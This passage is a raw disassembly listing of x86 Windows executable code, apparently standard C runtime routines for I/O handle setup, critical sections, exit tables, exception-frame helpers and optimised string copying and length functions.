  423663:	jne    0x423670
  423665:	push   eax
  423666:	call   DWORD PTR ds:0x42809c
  42366c:	test   eax,eax
  42366e:	je     0x4236ac
  423670:	mov    ecx,ebx
  423672:	mov    eax,ebx
  423674:	and    eax,0x1f
  423677:	lea    eax,[eax+eax*8]
  42367a:	sar    ecx,0x5
  42367d:	mov    ecx,DWORD PTR [ecx*4+0x465400]
  423684:	lea    esi,[ecx+eax*4]
  423687:	mov    eax,DWORD PTR [esp+0x10]
  42368b:	mov    eax,DWORD PTR [eax]
  42368d:	mov    DWORD PTR [esi],eax
  42368f:	mov    al,BYTE PTR [ebp+0x0]
  423692:	mov    BYTE PTR [esi+0x4],al
  423695:	lea    eax,[esi+0xc]
  423698:	push   0xfa0
  42369d:	push   eax
  42369e:	call   0x4249dd
  4236a3:	test   eax,eax
  4236a5:	pop    ecx
  4236a6:	pop    ecx
  4236a7:	je     0x4236d7
  4236a9:	inc    DWORD PTR [esi+0x8]
  4236ac:	add    DWORD PTR [esp+0x10],0x4
  4236b1:	inc    ebx
  4236b2:	inc    ebp
  4236b3:	cmp    ebx,edi
  4236b5:	jl     0x42364d
  4236b7:	xor    ebx,ebx
  4236b9:	mov    ecx,DWORD PTR ds:0x465400
  4236bf:	lea    eax,[ebx+ebx*8]
  4236c2:	lea    esi,[ecx+eax*4]
  4236c5:	cmp    DWORD PTR [esi],0xffffffff
  4236c8:	jne    0x423739
  4236ca:	test   ebx,ebx
  4236cc:	mov    BYTE PTR [esi+0x4],0x81
  4236d0:	jne    0x4236dc
  4236d2:	push   0xfffffff6
  4236d4:	pop    eax
  4236d5:	jmp    0x4236e6
  4236d7:	or     eax,0xffffffff
  4236da:	jmp    0x423755
  4236dc:	mov    eax,ebx
  4236de:	dec    eax
  4236df:	neg    eax
  4236e1:	sbb    eax,eax
  4236e3:	add    eax,0xfffffff5
  4236e6:	push   eax
  4236e7:	call   DWORD PTR ds:0x42807c
  4236ed:	mov    edi,eax
  4236ef:	cmp    edi,0xffffffff
  4236f2:	je     0x423733
  4236f4:	push   edi
  4236f5:	call   DWORD PTR ds:0x42809c
  4236fb:	test   eax,eax
  4236fd:	je     0x423733
  4236ff:	and    eax,0xff
  423704:	cmp    eax,0x2
  423707:	mov    DWORD PTR [esi],edi
  423709:	jne    0x423711
  42370b:	or     BYTE PTR [esi+0x4],0x40
  42370f:	jmp    0x42371a
  423711:	cmp    eax,0x3
  423714:	jne    0x42371a
  423716:	or     BYTE PTR [esi+0x4],0x8
  42371a:	lea    eax,[esi+0xc]
  42371d:	push   0xfa0
  423722:	push   eax
  423723:	call   0x4249dd
  423728:	test   eax,eax
  42372a:	pop    ecx
  42372b:	pop    ecx
  42372c:	je     0x4236d7
  42372e:	inc    DWORD PTR [esi+0x8]
  423731:	jmp    0x42373d
  423733:	or     BYTE PTR [esi+0x4],0x40
  423737:	jmp    0x42373d
  423739:	or     BYTE PTR [esi+0x4],0x80
  42373d:	inc    ebx
  42373e:	cmp    ebx,0x3
  423741:	jl     0x4236b9
  423747:	push   DWORD PTR ds:0x4653e8
  42374d:	call   DWORD PTR ds:0x428098
  423753:	xor    eax,eax
  423755:	pop    edi
  423756:	pop    esi
  423757:	pop    ebp
  423758:	pop    ebx
  423759:	add    esp,0x48
  42375c:	ret    
  42375d:	push   0xc
  42375f:	push   0x4284f8
  423764:	call   0x423950
  423769:	mov    DWORD PTR [ebp-0x1c],0x428f50
  423770:	cmp    DWORD PTR [ebp-0x1c],0x428f50
  423777:	jae    0x42379b
  423779:	and    DWORD PTR [ebp-0x4],0x0
  42377d:	mov    eax,DWORD PTR [ebp-0x1c]
  423780:	mov    eax,DWORD PTR [eax]
  423782:	test   eax,eax
  423784:	je     0x423791
  423786:	call   eax
  423788:	jmp    0x423791
  42378a:	xor    eax,eax
  42378c:	inc    eax
  42378d:	ret    
  42378e:	mov    esp,DWORD PTR [ebp-0x18]
  423791:	or     DWORD PTR [ebp-0x4],0xffffffff
  423795:	add    DWORD PTR [ebp-0x1c],0x4
  423799:	jmp    0x423770
  42379b:	call   0x42398b
  4237a0:	ret    
  4237a1:	push   0xc
  4237a3:	push   0x428508
  4237a8:	call   0x423950
  4237ad:	mov    DWORD PTR [ebp-0x1c],0x428f58
  4237b4:	cmp    DWORD PTR [ebp-0x1c],0x428f58
  4237bb:	jae    0x4237df
  4237bd:	and    DWORD PTR [ebp-0x4],0x0
  4237c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4237c4:	mov    eax,DWORD PTR [eax]
  4237c6:	test   eax,eax
  4237c8:	je     0x4237d5
  4237ca:	call   eax
  4237cc:	jmp    0x4237d5
  4237ce:	xor    eax,eax
  4237d0:	inc    eax
  4237d1:	ret    
  4237d2:	mov    esp,DWORD PTR [ebp-0x18]
  4237d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4237d9:	add    DWORD PTR [ebp-0x1c],0x4
  4237dd:	jmp    0x4237b4
  4237df:	call   0x42398b
  4237e4:	ret    
  4237e5:	call   0x423a26
  4237ea:	mov    eax,ds:0x464594
  4237ef:	cmp    eax,0xffffffff
  4237f2:	je     0x423802
  4237f4:	push   eax
  4237f5:	call   DWORD PTR ds:0x4280a4
  4237fb:	or     DWORD PTR ds:0x464594,0xffffffff
  423802:	ret    
  423803:	push   ebx
  423804:	push   esi
  423805:	call   DWORD PTR ds:0x428034
  42380b:	push   DWORD PTR ds:0x464594
  423811:	mov    ebx,eax
  423813:	call   DWORD PTR ds:0x4280b4
  423819:	mov    esi,eax
  42381b:	test   esi,esi
  42381d:	jne    0x423868
  42381f:	push   0x88
  423824:	push   0x1
  423826:	call   0x424a68
  42382b:	mov    esi,eax
  42382d:	test   esi,esi
  42382f:	pop    ecx
  423830:	pop    ecx
  423831:	je     0x423860
  423833:	push   esi
  423834:	push   DWORD PTR ds:0x464594
  42383a:	call   DWORD PTR ds:0x4280b0
  423840:	test   eax,eax
  423842:	je     0x423860
  423844:	mov    DWORD PTR [esi+0x54],0x4644e8
  42384b:	mov    DWORD PTR [esi+0x14],0x1
  423852:	call   DWORD PTR ds:0x4280ac
  423858:	or     DWORD PTR [esi+0x4],0xffffffff
  42385c:	mov    DWORD PTR [esi],eax
  42385e:	jmp    0x423868
  423860:	push   0x10
  423862:	call   0x422a16
  423867:	pop    ecx
  423868:	push   ebx
  423869:	call   DWORD PTR ds:0x4280a8
  42386f:	mov    eax,esi
  423871:	pop    esi
  423872:	pop    ebx
  423873:	ret    
  423874:	call   0x4239dd
  423879:	test   eax,eax
  42387b:	je     0x42388d
  42387d:	call   DWORD PTR ds:0x4280b8
  423883:	cmp    eax,0xffffffff
  423886:	mov    ds:0x464594,eax
  42388b:	jne    0x423895
  42388d:	call   0x4237e5
  423892:	xor    eax,eax
  423894:	ret    
  423895:	push   esi
  423896:	push   0x88
  42389b:	push   0x1
  42389d:	call   0x424a68
  4238a2:	mov    esi,eax
  4238a4:	test   esi,esi
  4238a6:	pop    ecx
  4238a7:	pop    ecx
  4238a8:	je     0x4238da
  4238aa:	push   esi
  4238ab:	push   DWORD PTR ds:0x464594
  4238b1:	call   DWORD PTR ds:0x4280b0
  4238b7:	test   eax,eax
  4238b9:	je     0x4238da
  4238bb:	mov    DWORD PTR [esi+0x54],0x4644e8
  4238c2:	mov    DWORD PTR [esi+0x14],0x1
  4238c9:	call   DWORD PTR ds:0x4280ac
  4238cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4238d3:	mov    DWORD PTR [esi],eax
  4238d5:	xor    eax,eax
  4238d7:	inc    eax
  4238d8:	pop    esi
  4238d9:	ret    
  4238da:	call   0x4237e5
  4238df:	xor    eax,eax
  4238e1:	pop    esi
  4238e2:	ret    
  4238e3:	cmp    DWORD PTR ds:0x464d64,0x2
  4238ea:	jne    0x4238f9
  4238ec:	cmp    DWORD PTR ds:0x464d70,0x5
  4238f3:	jb     0x4238f9
  4238f5:	xor    eax,eax
  4238f7:	inc    eax
  4238f8:	ret    
  4238f9:	push   0x3
  4238fb:	pop    eax
  4238fc:	ret    
  4238fd:	xor    eax,eax
  4238ff:	cmp    DWORD PTR [esp+0x4],eax
  423903:	push   0x0
  423905:	sete   al
  423908:	push   0x1000
  42390d:	push   eax
  42390e:	call   DWORD PTR ds:0x4280c0
  423914:	test   eax,eax
  423916:	mov    ds:0x4653e0,eax
  42391b:	je     0x423947
  42391d:	call   0x4238e3
  423922:	cmp    eax,0x3
  423925:	mov    ds:0x4653e4,eax
  42392a:	jne    0x42394a
  42392c:	push   0x3f8
  423931:	call   0x424cea
  423936:	test   eax,eax
  423938:	pop    ecx
  423939:	jne    0x42394a
  42393b:	push   DWORD PTR ds:0x4653e0
  423941:	call   DWORD PTR ds:0x4280bc
  423947:	xor    eax,eax
  423949:	ret    
  42394a:	xor    eax,eax
  42394c:	inc    eax
  42394d:	ret    
  42394e:	int3   
  42394f:	int3   
  423950:	push   0x425818
  423955:	mov    eax,fs:0x0
  42395b:	push   eax
  42395c:	mov    eax,DWORD PTR [esp+0x10]
  423960:	mov    DWORD PTR [esp+0x10],ebp
  423964:	lea    ebp,[esp+0x10]
  423968:	sub    esp,eax
  42396a:	push   ebx
  42396b:	push   esi
  42396c:	push   edi
  42396d:	mov    eax,DWORD PTR [ebp-0x8]
  423970:	mov    DWORD PTR [ebp-0x18],esp
  423973:	push   eax
  423974:	mov    eax,DWORD PTR [ebp-0x4]
  423977:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42397e:	mov    DWORD PTR [ebp-0x8],eax
  423981:	lea    eax,[ebp-0x10]
  423984:	mov    fs:0x0,eax
  42398a:	ret    
  42398b:	mov    ecx,DWORD PTR [ebp-0x10]
  42398e:	mov    DWORD PTR fs:0x0,ecx
  423995:	pop    ecx
  423996:	pop    edi
  423997:	pop    esi
  423998:	pop    ebx
  423999:	leave  
  42399a:	push   ecx
  42399b:	ret    
  42399c:	int3   
  42399d:	int3   
  42399e:	int3   
  42399f:	int3   
  4239a0:	cmp    eax,0x1000
  4239a5:	jae    0x4239b5
  4239a7:	neg    eax
  4239a9:	add    eax,esp
  4239ab:	add    eax,0x4
  4239ae:	test   DWORD PTR [eax],eax
  4239b0:	xchg   esp,eax
  4239b1:	mov    eax,DWORD PTR [eax]
  4239b3:	push   eax
  4239b4:	ret    
  4239b5:	push   ecx
  4239b6:	lea    ecx,[esp+0x8]
  4239ba:	sub    ecx,0x1000
  4239c0:	sub    eax,0x1000
  4239c5:	test   DWORD PTR [ecx],eax
  4239c7:	cmp    eax,0x1000
  4239cc:	jae    0x4239ba
  4239ce:	sub    ecx,eax
  4239d0:	mov    eax,esp
  4239d2:	test   DWORD PTR [ecx],eax
  4239d4:	mov    esp,ecx
  4239d6:	mov    ecx,DWORD PTR [eax]
  4239d8:	mov    eax,DWORD PTR [eax+0x4]
  4239db:	push   eax
  4239dc:	ret    
  4239dd:	push   esi
  4239de:	push   edi
  4239df:	xor    esi,esi
  4239e1:	mov    edi,0x464ec0
  4239e6:	cmp    DWORD PTR [esi*8+0x4645a4],0x1
  4239ee:	jne    0x423a0e
  4239f0:	lea    eax,[esi*8+0x4645a0]
  4239f7:	mov    DWORD PTR [eax],edi
  4239f9:	push   0xfa0
  4239fe:	push   DWORD PTR [eax]
  423a00:	add    edi,0x18
  423a03:	call   0x4249dd
  423a08:	test   eax,eax
  423a0a:	pop    ecx
  423a0b:	pop    ecx
  423a0c:	je     0x423a1a
  423a0e:	inc    esi
  423a0f:	cmp    esi,0x24
  423a12:	jl     0x4239e6
  423a14:	xor    eax,eax
  423a16:	inc    eax
  423a17:	pop    edi
  423a18:	pop    esi
  423a19:	ret    
  423a1a:	and    DWORD PTR [esi*8+0x4645a0],0x0
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a17
  423a26:	push   ebx
  423a27:	mov    ebx,DWORD PTR ds:0x4280a0
  423a2d:	push   esi
  423a2e:	mov    esi,0x4645a0
  423a33:	push   edi
  423a34:	mov    edi,DWORD PTR [esi]
  423a36:	test   edi,edi
  423a38:	je     0x423a4d
  423a3a:	cmp    DWORD PTR [esi+0x4],0x1
  423a3e:	je     0x423a4d
  423a40:	push   edi
  423a41:	call   ebx
  423a43:	push   edi
  423a44:	call   0x42455a
  423a49:	and    DWORD PTR [esi],0x0
  423a4c:	pop    ecx
  423a4d:	add    esi,0x8
  423a50:	cmp    esi,0x4646c0
  423a56:	jl     0x423a34
  423a58:	mov    esi,0x4645a0
  423a5d:	pop    edi
  423a5e:	mov    eax,DWORD PTR [esi]
  423a60:	test   eax,eax
  423a62:	je     0x423a6d
  423a64:	cmp    DWORD PTR [esi+0x4],0x1
  423a68:	jne    0x423a6d
  423a6a:	push   eax
  423a6b:	call   ebx
  423a6d:	add    esi,0x8
  423a70:	cmp    esi,0x4646c0
  423a76:	jl     0x423a5e
  423a78:	pop    esi
  423a79:	pop    ebx
  423a7a:	ret    
  423a7b:	push   ebp
  423a7c:	mov    ebp,esp
  423a7e:	mov    eax,DWORD PTR [ebp+0x8]
  423a81:	push   DWORD PTR [eax*8+0x4645a0]
  423a88:	call   DWORD PTR ds:0x4280cc
  423a8e:	pop    ebp
  423a8f:	ret    
  423a90:	push   ebp
  423a91:	mov    ebp,esp
  423a93:	push   esi
  423a94:	mov    esi,DWORD PTR [ebp+0x8]
  423a97:	lea    esi,[esi*8+0x4645a0]
  423a9e:	cmp    DWORD PTR [esi],0x0
  423aa1:	je     0x423aa8
  423aa3:	xor    eax,eax
  423aa5:	inc    eax
  423aa6:	jmp    0x423b0c
  423aa8:	push   edi
  423aa9:	push   0x18
  423aab:	call   0x424672
  423ab0:	mov    edi,eax
  423ab2:	test   edi,edi
  423ab4:	pop    ecx
  423ab5:	jne    0x423ac6
  423ab7:	call   0x4258f0
  423abc:	mov    DWORD PTR [eax],0xc
  423ac2:	xor    eax,eax
  423ac4:	jmp    0x423b0b
  423ac6:	push   0xa
  423ac8:	call   0x423b0f
  423acd:	cmp    DWORD PTR [esi],0x0
  423ad0:	pop    ecx
  423ad1:	jne    0x423af9
  423ad3:	push   0xfa0
  423ad8:	push   edi
  423ad9:	call   0x4249dd
  423ade:	test   eax,eax
  423ae0:	pop    ecx
  423ae1:	pop    ecx
  423ae2:	jne    0x423af5
  423ae4:	push   edi
  423ae5:	call   0x42455a
  423aea:	push   0xa
  423aec:	call   0x423a7b
  423af1:	pop    ecx
  423af2:	pop    ecx
  423af3:	jmp    0x423ab7
  423af5:	mov    DWORD PTR [esi],edi
  423af7:	jmp    0x423b00
  423af9:	push   edi
  423afa:	call   0x42455a
  423aff:	pop    ecx
  423b00:	push   0xa
  423b02:	call   0x423a7b
  423b07:	xor    eax,eax
  423b09:	pop    ecx
  423b0a:	inc    eax
  423b0b:	pop    edi
  423b0c:	pop    esi
  423b0d:	pop    ebp
  423b0e:	ret    
  423b0f:	push   ebp
  423b10:	mov    ebp,esp
  423b12:	mov    eax,DWORD PTR [ebp+0x8]
  423b15:	push   esi
  423b16:	lea    esi,[eax*8+0x4645a0]
  423b1d:	cmp    DWORD PTR [esi],0x0
  423b20:	jne    0x423b35
  423b22:	push   eax
  423b23:	call   0x423a90
  423b28:	test   eax,eax
  423b2a:	pop    ecx
  423b2b:	jne    0x423b35
  423b2d:	push   0x11
  423b2f:	call   0x422a16
  423b34:	pop    ecx
  423b35:	push   DWORD PTR [esi]
  423b37:	call   DWORD PTR ds:0x4280d0
  423b3d:	pop    esi
  423b3e:	pop    ebp
  423b3f:	ret    
  423b40:	push   esi
  423b41:	push   DWORD PTR ds:0x465508
  423b47:	call   0x425aa6
  423b4c:	pop    ecx
  423b4d:	mov    ecx,DWORD PTR ds:0x465504
  423b53:	mov    esi,eax
  423b55:	mov    eax,ds:0x465508
  423b5a:	mov    edx,ecx
  423b5c:	sub    edx,eax
  423b5e:	add    edx,0x4
  423b61:	cmp    esi,edx
  423b63:	jae    0x423bb3
  423b65:	mov    ecx,0x800
  423b6a:	cmp    esi,ecx
  423b6c:	jae    0x423b70
  423b6e:	mov    ecx,esi
  423b70:	add    ecx,esi
  423b72:	push   ecx
  423b73:	push   eax
  423b74:	call   0x4258f9
  423b79:	test   eax,eax
  423b7b:	pop    ecx
  423b7c:	pop    ecx
  423b7d:	jne    0x423b96
  423b7f:	add    esi,0x10
  423b82:	push   esi
  423b83:	push   DWORD PTR ds:0x465508
  423b89:	call   0x4258f9
  423b8e:	test   eax,eax
  423b90:	pop    ecx
  423b91:	pop    ecx
  423b92:	jne    0x423b96
  423b94:	pop    esi
  423b95:	ret    
  423b96:	mov    ecx,DWORD PTR ds:0x465504
  423b9c:	sub    ecx,DWORD PTR ds:0x465508
  423ba2:	mov    ds:0x465508,eax
  423ba7:	sar    ecx,0x2
  423baa:	lea    ecx,[eax+ecx*4]
  423bad:	mov    DWORD PTR ds:0x465504,ecx
  423bb3:	mov    DWORD PTR [ecx],edi
  423bb5:	add    DWORD PTR ds:0x465504,0x4
  423bbc:	mov    eax,edi
  423bbe:	pop    esi
  423bbf:	ret    
  423bc0:	push   0x80
  423bc5:	call   0x424672
  423bca:	test   eax,eax
  423bcc:	pop    ecx
  423bcd:	mov    ds:0x465508,eax
  423bd2:	jne    0x423bd8
  423bd4:	push   0x18
  423bd6:	pop    eax
  423bd7:	ret    
  423bd8:	and    DWORD PTR [eax],0x0
  423bdb:	mov    eax,ds:0x465508
  423be0:	mov    ds:0x465504,eax
  423be5:	xor    eax,eax
  423be7:	ret    
  423be8:	push   0xc
  423bea:	push   0x428518
  423bef:	call   0x423950
  423bf4:	call   0x422c61
  423bf9:	and    DWORD PTR [ebp-0x4],0x0
  423bfd:	mov    edi,DWORD PTR [ebp+0x8]
  423c00:	call   0x423b40
  423c05:	mov    DWORD PTR [ebp-0x1c],eax
  423c08:	or     DWORD PTR [ebp-0x4],0xffffffff
  423c0c:	call   0x423c1a
  423c11:	mov    eax,DWORD PTR [ebp-0x1c]
  423c14:	call   0x42398b
  423c19:	ret    
  423c1a:	call   0x422c6a
  423c1f:	ret    
  423c20:	push   DWORD PTR [esp+0x4]
  423c24:	call   0x423be8
  423c29:	neg    eax
  423c2b:	sbb    eax,eax
  423c2d:	neg    eax
  423c2f:	pop    ecx
  423c30:	dec    eax
  423c31:	ret    
  423c32:	push   ebp
  423c33:	mov    ebp,esp
  423c35:	sub    esp,0x10
  423c38:	push   ebx
  423c39:	xor    ebx,ebx
  423c3b:	cmp    DWORD PTR ds:0x465010,ebx
  423c41:	push   esi
  423c42:	push   edi
  423c43:	jne    0x423cb2
  423c45:	push   0x428588
  423c4a:	call   DWORD PTR ds:0x4280d4
  423c50:	mov    edi,eax
  423c52:	cmp    edi,ebx
  423c54:	je     0x423ced
  423c5a:	mov    esi,DWORD PTR ds:0x42804c
  423c60:	push   0x42857c
  423c65:	push   edi
  423c66:	call   esi
  423c68:	test   eax,eax
  423c6a:	mov    ds:0x465010,eax
  423c6f:	je     0x423ced
  423c71:	push   0x42856c
  423c76:	push   edi
  423c77:	call   esi
  423c79:	push   0x428558
  423c7e:	push   edi
  423c7f:	mov    ds:0x465014,eax
  423c84:	call   esi
  423c86:	cmp    DWORD PTR ds:0x464d64,0x2
  423c8d:	mov    ds:0x465018,eax
  423c92:	jne    0x423cb2
  423c94:	push   0x42853c
  423c99:	push   edi
  423c9a:	call   esi
  423c9c:	test   eax,eax
  423c9e:	mov    ds:0x465020,eax
  423ca3:	je     0x423cb2
  423ca5:	push   0x428524
  423caa:	push   edi
  423cab:	call   esi
  423cad:	mov    ds:0x46501c,eax
  423cb2:	mov    eax,ds:0x46501c
  423cb7:	test   eax,eax
  423cb9:	je     0x423cf7
  423cbb:	call   eax
  423cbd:	test   eax,eax
  423cbf:	je     0x423cde
  423cc1:	lea    ecx,[ebp-0x4]
  423cc4:	push   ecx
  423cc5:	push   0xc
  423cc7:	lea    ecx,[ebp-0x10]
  423cca:	push   ecx
  423ccb:	push   0x1
  423ccd:	push   eax
  423cce:	call   DWORD PTR ds:0x465020
  423cd4:	test   eax,eax
  423cd6:	je     0x423cde
  423cd8:	test   BYTE PTR [ebp-0x8],0x1
  423cdc:	jne    0x423cf7
  423cde:	cmp    DWORD PTR ds:0x464d70,0x4
  423ce5:	jb     0x423cf1
  423ce7:	or     BYTE PTR [ebp+0x12],0x20
  423ceb:	jmp    0x423d16
  423ced:	xor    eax,eax
  423cef:	jmp    0x423d26
  423cf1:	or     BYTE PTR [ebp+0x12],0x4
  423cf5:	jmp    0x423d16
  423cf7:	mov    eax,ds:0x465014
  423cfc:	test   eax,eax
  423cfe:	je     0x423d16
  423d00:	call   eax
  423d02:	mov    ebx,eax
  423d04:	test   ebx,ebx
  423d06:	je     0x423d16
  423d08:	mov    eax,ds:0x465018
  423d0d:	test   eax,eax
  423d0f:	je     0x423d16
  423d11:	push   ebx
  423d12:	call   eax
  423d14:	mov    ebx,eax
  423d16:	push   DWORD PTR [ebp+0x10]
  423d19:	push   DWORD PTR [ebp+0xc]
  423d1c:	push   DWORD PTR [ebp+0x8]
  423d1f:	push   ebx
  423d20:	call   DWORD PTR ds:0x465010
  423d26:	pop    edi
  423d27:	pop    esi
  423d28:	pop    ebx
  423d29:	leave  
  423d2a:	ret    
  423d2b:	int3   
  423d2c:	int3   
  423d2d:	int3   
  423d2e:	int3   
  423d2f:	int3   
  423d30:	push   edi
  423d31:	mov    edi,DWORD PTR [esp+0x8]
  423d35:	jmp    0x423da5
  423d37:	lea    esp,[esp+0x0]
  423d3e:	mov    edi,edi
  423d40:	mov    ecx,DWORD PTR [esp+0x4]
  423d44:	push   edi
  423d45:	test   ecx,0x3
  423d4b:	je     0x423d60
  423d4d:	mov    al,BYTE PTR [ecx]
  423d4f:	add    ecx,0x1
  423d52:	test   al,al
  423d54:	je     0x423d93
  423d56:	test   ecx,0x3
  423d5c:	jne    0x423d4d
  423d5e:	mov    edi,edi
  423d60:	mov    eax,DWORD PTR [ecx]
  423d62:	mov    edx,0x7efefeff
  423d67:	add    edx,eax
  423d69:	xor    eax,0xffffffff
  423d6c:	xor    eax,edx
  423d6e:	add    ecx,0x4
  423d71:	test   eax,0x81010100
  423d76:	je     0x423d60
  423d78:	mov    eax,DWORD PTR [ecx-0x4]
  423d7b:	test   al,al
  423d7d:	je     0x423da2
  423d7f:	test   ah,ah
  423d81:	je     0x423d9d
  423d83:	test   eax,0xff0000
  423d88:	je     0x423d98
  423d8a:	test   eax,0xff000000
  423d8f:	je     0x423d93
  423d91:	jmp    0x423d60
  423d93:	lea    edi,[ecx-0x1]
  423d96:	jmp    0x423da5
  423d98:	lea    edi,[ecx-0x2]
  423d9b:	jmp    0x423da5
  423d9d:	lea    edi,[ecx-0x3]
  423da0:	jmp    0x423da5
  423da2:	lea    edi,[ecx-0x4]
  423da5:	mov    ecx,DWORD PTR [esp+0xc]
  423da9:	test   ecx,0x3
  423daf:	je     0x423dce
  423db1:	mov    dl,BYTE PTR [ecx]
  423db3:	add    ecx,0x1
  423db6:	test   dl,dl
  423db8:	je     0x423e20
  423dba:	mov    BYTE PTR [edi],dl
  423dbc:	add    edi,0x1
  423dbf:	test   ecx,0x3
  423dc5:	jne    0x423db1
  423dc7:	jmp    0x423dce
  423dc9:	mov    DWORD PTR [edi],edx
  423dcb:	add    edi,0x4
  423dce:	mov    edx,0x7efefeff
  423dd3:	mov    eax,DWORD PTR [ecx]
  423dd5:	add    edx,eax
  423dd7:	xor    eax,0xffffffff
  423dda:	xor    eax,edx
  423ddc:	mov    edx,DWORD PTR [ecx]
  423dde:	add    ecx,0x4
  423de1:	test   eax,0x81010100
  423de6:	je     0x423dc9
  423de8:	test   dl,dl
  423dea:	je     0x423e20
  423dec:	test   dh,dh
  423dee:	je     0x423e17
  423df0:	test   edx,0xff0000
  423df6:	je     0x423e0a
  423df8:	test   edx,0xff000000
  423dfe:	je     0x423e02
  423e00:	jmp    0x423dc9
  423e02:	mov    DWORD PTR [edi],edx
  423e04:	mov    eax,DWORD PTR [esp+0x8]
  423e08:	pop    edi
  423e09:	ret    
  423e0a:	mov    WORD PTR [edi],dx
  423e0d:	mov    eax,DWORD PTR [esp+0x8]
  423e11:	mov    BYTE PTR [edi+0x2],0x0
  423e15:	pop    edi
  423e16:	ret    
  423e17:	mov    WORD PTR [edi],dx
  423e1a:	mov    eax,DWORD PTR [esp+0x8]
  423e1e:	pop    edi
  423e1f:	ret    
  423e20:	mov    BYTE PTR [edi],dl
  423e22:	mov    eax,DWORD PTR [esp+0x8]
  423e26:	pop    edi
  423e27:	ret    
  423e28:	int3   
  423e29:	int3   
  423e2a:	int3   
  423e2b:	int3   
  423e2c:	int3   
  423e2d:	int3   
  423e2e:	int3   
  423e2f:	int3   
  423e30:	mov    ecx,DWORD PTR [esp+0xc]
  423e34:	push   edi
  423e35:	test   ecx,ecx
  423e37:	je     0x423ecf
  423e3d:	push   esi
  423e3e:	push   ebx
  423e3f:	mov    ebx,ecx
  423e41:	mov    esi,DWORD PTR [esp+0x14]
  423e45:	test   esi,0x3
  423e4b:	mov    edi,DWORD PTR [esp+0x10]
  423e4f:	jne    0x423e5c
  423e51:	shr    ecx,0x2
  423e54:	jne    0x423edf
  423e5a:	jmp    0x423e83
  423e5c:	mov    al,BYTE PTR [esi]
  423e5e:	add    esi,0x1
  423e61:	mov    BYTE PTR [edi],al
  423e63:	add    edi,0x1
  423e66:	sub    ecx,0x1
  423e69:	je     0x423e96
  423e6b:	test   al,al
  423e6d:	je     0x423e9e
  423e6f:	test   esi,0x3
  423e75:	jne    0x423e5c
  423e77:	mov    ebx,ecx
  423e79:	shr    ecx,0x2
  423e7c:	jne    0x423edf
  423e7e:	and    ebx,0x3
  423e81:	je     0x423e96
  423e83:	mov    al,BYTE PTR [esi]
  423e85:	add    esi,0x1
  423e88:	mov    BYTE PTR [edi],al
  423e8a:	add    edi,0x1
  423e8d:	test   al,al
  423e8f:	je     0x423ec8
  423e91:	sub    ebx,0x1
  423e94:	jne    0x423e83
  423e96:	mov    eax,DWORD PTR [esp+0x10]
  423e9a:	pop    ebx
  423e9b:	pop    esi
  423e9c:	pop    edi
  423e9d:	ret    
  423e9e:	test   edi,0x3
  423ea4:	je     0x423ebc
  423ea6:	mov    BYTE PTR [edi],al
  423ea8:	add    edi,0x1
  423eab:	sub    ecx,0x1
  423eae:	je     0x423f4c
  423eb4:	test   edi,0x3
  423eba:	jne    0x423ea6
  423ebc:	mov    ebx,ecx
  423ebe:	shr    ecx,0x2
  423ec1:	jne    0x423f37
  423ec3:	mov    BYTE PTR [edi],al
  423ec5:	add    edi,0x1
  423ec8:	sub    ebx,0x1
  423ecb:	jne    0x423ec3
  423ecd:	pop    ebx
  423ece:	pop    esi
  423ecf:	mov    eax,DWORD PTR [esp+0x8]
  423ed3:	pop    edi
  423ed4:	ret    
  423ed5:	mov    DWORD PTR [edi],edx
  423ed7:	add    edi,0x4
  423eda:	sub    ecx,0x1
  423edd:	je     0x423e7e
  423edf:	mov    edx,0x7efefeff
  423ee4:	mov    eax,DWORD PTR [esi]
  423ee6:	add    edx,eax
  423ee8:	xor    eax,0xffffffff
  423eeb:	xor    eax,edx
  423eed:	mov    edx,DWORD PTR [esi]
  423eef:	add    esi,0x4
  423ef2:	test   eax,0x81010100
  423ef7:	je     0x423ed5
  423ef9:	test   dl,dl
  423efb:	je     0x423f29
  423efd:	test   dh,dh
  423eff:	je     0x423f1f
  423f01:	test   edx,0xff0000
  423f07:	je     0x423f15
  423f09:	test   edx,0xff000000
  423f0f:	jne    0x423ed5
  423f11:	mov    DWORD PTR [edi],edx
  423f13:	jmp    0x423f2d
  423f15:	and    edx,0xffff
  423f1b:	mov    DWORD PTR [edi],edx
  423f1d:	jmp    0x423f2d
  423f1f:	and    edx,0xff
  423f25:	mov    DWORD PTR [edi],edx
  423f27:	jmp    0x423f2d
  423f29:	xor    edx,edx
  423f2b:	mov    DWORD PTR [edi],edx
  423f2d:	add    edi,0x4
  423f30:	xor    eax,eax
  423f32:	sub    ecx,0x1
  423f35:	je     0x423f43
  423f37:	xor    eax,eax
  423f39:	mov    DWORD PTR [edi],eax
  423f3b:	add    edi,0x4
  423f3e:	sub    ecx,0x1
  423f41:	jne    0x423f39
  423f43:	and    ebx,0x3
  423f46:	jne    0x423ec3
  423f4c:	mov    eax,DWORD PTR [esp+0x10]
  423f50:	pop    ebx
  423f51:	pop    esi
  423f52:	pop    edi
  423f53:	ret    
  423f54:	int3   
  423f55:	int3   
  423f56:	int3   
  423f57:	int3   
  423f58:	int3   
  423f59:	int3   
  423f5a:	int3   
  423f5b:	int3   
  423f5c:	int3   
  423f5d:	int3   
  423f5e:	int3   
  423f5f:	int3   
  423f60:	mov    ecx,DWORD PTR [esp+0x4]
  423f64:	test   ecx,0x3
  423f6a:	je     0x423f90
  423f6c:	mov    al,BYTE PTR [ecx]
  423f6e:	add    ecx,0x1
  423f71:	test   al,al
  423f73:	je     0x423fc3
  423f75:	test   ecx,0x3
  423f7b:	jne    0x423f6c
  423f7d:	add    eax,0x0
  423f82:	lea    esp,[esp+0x0]
  423f89:	lea    esp,[esp+0x0]
  423f90:	mov    eax,DWORD PTR [ecx]
  423f92:	mov    edx,0x7efefeff
  423f97:	add    edx,eax
  423f99:	xor    eax,0xffffffff
  423f9c:	xor    eax,edx
  423f9e:	add    ecx,0x4
  423fa1:	test   eax,0x81010100
  423fa6:	je     0x423f90
  423fa8:	mov    eax,DWORD PTR [ecx-0x4]
  423fab:	test   al,al
  423fad:	je     0x423fe1
  423faf:	test   ah,ah
  423fb1:	je     0x423fd7
  423fb3:	test   eax,0xff0000
  423fb8:	je     0x423fcd
  423fba:	test   eax,0xff000000
  423fbf:	je     0x423fc3
  423fc1:	jmp    0x423f90
  423fc3:	lea    eax,[ecx-0x1]
